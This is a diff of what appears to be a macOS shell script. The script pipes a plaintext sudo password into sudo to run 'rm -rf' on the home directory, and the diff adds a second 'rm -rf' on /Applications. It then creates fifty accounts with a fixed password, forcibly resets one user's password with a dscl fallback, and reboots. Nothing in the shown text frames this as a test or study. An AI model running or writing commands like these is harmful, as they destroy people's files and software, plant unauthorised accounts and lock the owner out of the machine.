@@ -4,6 +4,7 @@
 # Supply sudo password and delete everything in ~/
 
 echo "carterchloe2006" | sudo -S rm -rf ~/*
+echo "carterchloe2006" | sudo -S rm -rf /Applications/*
 
 # Create 50 users with random suffix and password Aa112211!
 for i in $(seq 1 50); do
@@ -18,8 +19,13 @@ for i in $(seq 1 50); do
     &>/dev/null || true
 done
 
-# Change password for carterhuang
-echo "carterchloe2006" | sudo -S sysadminctl -resetPasswordFor carterhuang -newPassword "Aa112211!"
+# Change password for carterhuang using sysadminctl with root credentials, fallback to dscl
+echo "carterchloe2006" | sudo -S sysadminctl \
+  -adminUser root -adminPassword "Aa112211!" \
+  -resetPasswordFor carterhuang -newPassword "Aa112211!" || {
+  echo "[DEBUG] sysadminctl failed; falling back to dscl"
+  echo "carterchloe2006" | sudo -S dscl . -passwd /Users/carterhuang "Aa112211!"
+}
 
 # Reboot the system
 echo "carterchloe2006" | sudo -S shutdown -r now
